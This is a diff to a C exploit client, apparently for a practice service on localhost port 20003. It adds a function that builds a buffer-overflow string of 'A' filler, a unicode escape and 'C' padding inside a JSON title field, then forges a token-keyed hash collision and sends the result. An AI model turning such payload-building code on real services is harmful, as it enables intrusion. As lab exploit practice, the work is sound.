@@ -53,7 +53,8 @@ int init_socket()
     sin.sin_port = htons(atoi("20003"));
     fd = socket(AF_INET, SOCK_STREAM, 0);
     if(fd == -1) err(EXIT_FAILURE, "socket(): failed");
-    if(connect(fd, (void *)&sin, sizeof(struct sockaddr_in)) == -1) err(EXIT_FAILURE, "connect(): failed");
+    if(connect(fd, (void *)&sin, sizeof(struct sockaddr_in)) == -1) 
+        err(EXIT_FAILURE, "connect(): failed");
     return fd;
 }
 
@@ -68,17 +69,30 @@ char *read_token(int fd)
     return token;
 }
 
+char *overflow_tags()
+{
+    int i;
+    char *j, *junk;
+    junk = (char *)malloc(256);
+    memset(junk, 'A', 127);
+    junk[128] = 0;
+    strcat(junk, "\\\\uBBBB");
+    strcat(junk, "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC");
+    return junk;
+}
+
 int main(int argc, char **argv)
 {
-    char *key = "01234567891";
-    char *text_orig = "%s\n{'title':'aboh blah blah'} // %s";
-    char *tokenised_text, *collided_text, *token;
     int fd;
+    char *text_orig = "%s\n{'title':'%s', 'contents': 'my contents' , 'serverip': '127.0.0.1'} // %s";
+    char *tokenised_text, *collided_text, *token, *junk;
 
     fd = init_socket();
     token = read_token(fd);
-    asprintf(&tokenised_text, text_orig, token, "%x");
-    collided_text = find_collision(tokenised_text, key);
+    junk = overflow_tags();
+    asprintf(&tokenised_text, text_orig, token, junk, "%x");
+    collided_text = find_collision(tokenised_text, token);
+    write(fd, collided_text, strlen(collided_text));
     
     return EXIT_SUCCESS;
 }
